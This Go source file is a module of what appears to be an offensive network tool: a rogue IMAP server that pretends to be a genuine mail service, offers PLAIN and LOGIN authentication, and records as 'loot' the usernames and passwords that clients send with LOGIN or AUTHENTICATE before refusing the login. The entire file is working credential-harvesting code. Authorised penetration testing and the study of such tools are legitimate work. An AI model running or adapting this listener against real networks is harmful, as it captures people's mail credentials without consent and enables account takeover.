// Package imap implements a rogue IMAP4 server that captures cleartext
// credentials from the LOGIN command and the AUTHENTICATE PLAIN / LOGIN
// SASL mechanisms.
package imap

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"lantern/internal/core"
)

const (
	ServiceName = "imap"
	DefaultPort = 143
	readTimeout = 30 * time.Second
)

type Module struct {
	server *core.TCPServer
	Logger *core.Logger
}

func New(logger *core.Logger) *Module {
	m := &Module{Logger: logger}
	m.server = &core.TCPServer{
		Service: "IMAP",
		Address: "0.0.0.0",
		Port:    DefaultPort,
		Logger:  logger,
		Handler: m.handle,
	}
	return m
}

func (m *Module) Name() string      { return ServiceName }
func (m *Module) HasListener() bool { return true }
func (m *Module) HasPoisoner() bool { return false }

func (m *Module) StartPoisoner(context.Context, core.Config) error {
	return fmt.Errorf("IMAP poisoning is not supported")
}

func (m *Module) StartListener(ctx context.Context, cfg core.Config) error {
	m.server.Logger = m.Logger
	return m.server.Start(ctx, cfg)
}

func (m *Module) Stop() { m.server.Stop() }

func (m *Module) handle(ctx context.Context, conn net.Conn) {
	client := core.ClientIP(conn)
	reader := bufio.NewReader(conn)
	fmt.Fprint(conn, "* OK IMAP4rev1 Service Ready\r\n")

	readLine := func() (string, bool) {
		core.SetDeadline(ctx, conn, readTimeout)
		line, err := reader.ReadString('\n')
		if err != nil {
			return "", false
		}
		return strings.TrimRight(line, "\r\n"), true
	}

	for {
		line, ok := readLine()
		if !ok {
			return
		}
		tag, rest := splitTag(line)
		verb, arg := splitCommand(rest)

		switch strings.ToUpper(verb) {
		case "CAPABILITY":
			fmt.Fprint(conn, "* CAPABILITY IMAP4rev1 AUTH=PLAIN AUTH=LOGIN\r\n")
			fmt.Fprintf(conn, "%s OK CAPABILITY completed\r\n", tag)
		case "LOGIN":
			user, pass := parseLogin(arg)
			m.capture(client, "LOGIN", user, pass)
			fmt.Fprintf(conn, "%s NO LOGIN failed\r\n", tag)
			return
		case "AUTHENTICATE":
			if !m.handleAuth(conn, client, tag, arg, readLine) {
				return
			}
		case "LOGOUT":
			fmt.Fprint(conn, "* BYE Logging out\r\n")
			fmt.Fprintf(conn, "%s OK LOGOUT completed\r\n", tag)
			return
		default:
			fmt.Fprintf(conn, "%s BAD Command not recognized\r\n", tag)
		}
	}
}

func (m *Module) handleAuth(conn net.Conn, client, tag, arg string, readLine func() (string, bool)) bool {
	mech := strings.ToUpper(strings.Fields(arg + " ")[0])
	switch mech {
	case "PLAIN":
		fmt.Fprint(conn, "+ \r\n")
		blob, ok := readLine()
		if !ok {
			return false
		}
		if user, pass, ok := decodePlain(blob); ok {
			m.capture(client, "AUTH-PLAIN", user, pass)
		}
		fmt.Fprintf(conn, "%s NO authentication failed\r\n", tag)
		return false
	case "LOGIN":
		fmt.Fprint(conn, "+ "+b64("Username:")+"\r\n")
		userB64, ok := readLine()
		if !ok {
			return false
		}
		fmt.Fprint(conn, "+ "+b64("Password:")+"\r\n")
		passB64, ok := readLine()
		if !ok {
			return false
		}
		m.capture(client, "AUTH-LOGIN", decodeB64(userB64), decodeB64(passB64))
		fmt.Fprintf(conn, "%s NO authentication failed\r\n", tag)
		return false
	default:
		fmt.Fprintf(conn, "%s NO Unsupported authentication mechanism\r\n", tag)
		return true
	}
}

func splitTag(line string) (tag, rest string) {
	parts := strings.SplitN(line, " ", 2)
	tag = parts[0]
	if tag == "" {
		tag = "*"
	}
	if len(parts) == 2 {
		rest = parts[1]
	}
	return tag, rest
}

func splitCommand(line string) (verb, arg string) {
	parts := strings.SplitN(line, " ", 2)
	verb = parts[0]
	if len(parts) == 2 {
		arg = strings.TrimSpace(parts[1])
	}
	return verb, arg
}

// parseLogin parses `user pass` from a LOGIN command, honouring IMAP quoting.
func parseLogin(arg string) (user, pass string) {
	fields := tokenize(arg)
	if len(fields) >= 1 {
		user = fields[0]
	}
	if len(fields) >= 2 {
		pass = fields[1]
	}
	return user, pass
}

// tokenize splits an IMAP argument list on spaces while keeping "quoted" and
// {literal}-style strings intact enough for credential capture.
func tokenize(s string) []string {
	var tokens []string
	var current strings.Builder
	inQuotes := false
	flush := func() {
		if current.Len() > 0 {
			tokens = append(tokens, current.String())
			current.Reset()
		}
	}
	for _, r := range s {
		switch {
		case r == '"':
			inQuotes = !inQuotes
		case r == ' ' && !inQuotes:
			flush()
		default:
			current.WriteRune(r)
		}
	}
	flush()
	return tokens
}

func decodePlain(blob string) (user, pass string, ok bool) {
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(blob))
	if err != nil {
		return "", "", false
	}
	parts := strings.Split(string(raw), "\x00")
	switch len(parts) {
	case 3:
		return parts[1], parts[2], true
	case 2:
		return parts[0], parts[1], true
	default:
		return "", "", false
	}
}

func decodeB64(s string) string {
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(s))
	if err != nil {
		return s
	}
	return string(raw)
}

func b64(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func (m *Module) capture(client, mech, user, pass string) {
	if m.Logger == nil {
		return
	}
	if user == "" {
		user = "<not provided>"
	}
	m.Logger.Loot(
		fmt.Sprintf("[IMAP] %s credentials from %s", mech, client),
		"[IMAP] Username : %s\n[IMAP] Password : %q\n[IMAP] Hash     : %s:%s",
		user, pass, user, pass)
}
